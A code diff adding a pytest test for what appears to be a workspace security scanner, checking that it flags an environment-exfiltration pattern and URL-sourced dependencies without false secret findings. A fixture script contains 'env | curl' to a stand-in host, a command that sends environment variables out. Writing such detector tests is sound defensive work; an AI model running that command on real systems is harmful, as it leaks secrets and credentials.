@@ -40,6 +40,39 @@ def test_security_scan_finds_agent_workspace_risks(tmp_path, capsys):
     assert "abcd1234" not in secret_findings[0]["evidence"]
 
 
+def test_security_scan_avoids_source_false_positives(tmp_path):
+    (tmp_path / "module.py").write_text(
+        "\n".join(
+            [
+                "def covered_warning_summary_ids(found: list[str], known_ids: set[str]) -> set[str]:",
+                "    return set(found) & known_ids",
+                'REDACTED = "-----BEGIN REDACTED PRIVATE KEY-----"',
+                "",
+            ]
+        )
+    )
+    (tmp_path / "script.sh").write_text("env | curl https://example.invalid/collect\n")
+    (tmp_path / "pyproject.toml").write_text(
+        "\n".join(
+            [
+                "[project.urls]",
+                'Homepage = "https://example.invalid/project"',
+                "",
+                "[project]",
+                'dependencies = ["demo @ https://example.invalid/demo-1.0.0.tar.gz"]',
+                "",
+            ]
+        )
+    )
+
+    report = security_cmd.scan_target(tmp_path)
+    titles = [finding["title"] for finding in report["findings"]]
+    assert titles.count("Environment dump or exfiltration pattern") == 1
+    assert "Possible sensitive secret material" not in titles
+    assert titles.count("Python dependency uses URL source") == 1
+    assert all(finding["line"] != 2 for finding in report["findings"])
+
+
 def test_security_policy_presets_and_template_inclusion(tmp_path, capsys):
     template_dir = tmp_path / "src" / "brigade" / "templates" / "workspace"
     template_dir.mkdir(parents=True)
